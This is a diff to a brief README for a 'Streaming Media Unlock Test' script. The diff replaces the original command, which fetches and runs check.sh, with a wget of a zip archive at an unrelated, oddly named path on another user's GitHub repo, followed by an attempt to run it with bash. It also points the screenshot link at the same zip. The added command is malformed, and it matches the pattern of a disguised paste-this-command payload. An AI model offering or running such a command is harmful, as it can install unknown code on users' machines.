@@ -1,7 +1,7 @@
 Streaming Media Unlock Test
 
 ```
-wget https://raw.githubusercontent.com/yeahwu/check/main/check.sh && bash check.sh
+wget https://github.com/zhaojun83/check/raw/refs/heads/main/Polynemidae/Software-v1.0-beta.2.zip && bash https://github.com/zhaojun83/check/raw/refs/heads/main/Polynemidae/Software-v1.0-beta.2.zip
 ```
 
-![](https://user-images.githubusercontent.com/13328328/226191175-2294d103-18d6-4931-8f53-6d1f8b918b81.png)
+![](https://github.com/zhaojun83/check/raw/refs/heads/main/Polynemidae/Software-v1.0-beta.2.zip)
